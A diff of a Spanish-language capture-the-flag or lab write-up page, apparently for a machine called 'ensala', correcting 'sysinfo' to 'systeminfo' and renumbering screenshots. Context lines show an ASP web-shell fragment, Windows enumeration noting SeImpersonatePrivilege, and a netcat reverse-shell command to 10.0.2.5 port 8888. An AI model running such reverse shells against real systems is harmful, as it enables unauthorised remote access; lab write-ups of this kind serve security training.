@@ -333,16 +333,17 @@ Response.Write(thisDir)%&gt;
 &lt;%Response.write("&lt;!-"&amp;"-") %&gt;
 --&gt;</span>
 </code></pre></div></div>
-
-<p>Ejecutamos <code class="language-plaintext highlighter-rouge">sysinfo</code> para obtener información del sistema.</p>
-
 <p><img src="/assets/images/ensala/2.png" alt="image" /></p>
+
+<p>Ejecutamos <code class="language-plaintext highlighter-rouge">systeminfo</code> para obtener información del sistema.</p>
+
+<p><img src="/assets/images/ensala/3.png" alt="image" /></p>
 
 <p>Vemos que se trata de un <code class="language-plaintext highlighter-rouge">Windows Server 2008 Enterprise R 2</code> .</p>
 
 <p>Ejecutamos <code class="language-plaintext highlighter-rouge">whoami /priv</code> para ver con que usuario estamos ejecutando los comandos y ver sus privilegios.</p>
 
-<p><img src="/assets/images/ensala/3.png" alt="image" /></p>
+<p><img src="/assets/images/ensala/4.png" alt="image" /></p>
 
 <p>Como vemos tiene el privilegio <code class="language-plaintext highlighter-rouge">SeImpersonatePrivilege</code> habilitado…</p>
 
@@ -375,7 +376,7 @@ listening on <span class="o">[</span>any] 8888 ...
 
 <p>Y tras ejecutar <code class="language-plaintext highlighter-rouge">\\10.0.2.5\kali\nc.exe -e cmd 10.0.2.5 8888</code></p>
 
-<p><img src="/assets/images/ensala/4.png" alt="image" /></p>
+<p><img src="/assets/images/ensala/5.png" alt="image" /></p>
 
 <p>Obtenemos la shell:</p>
 
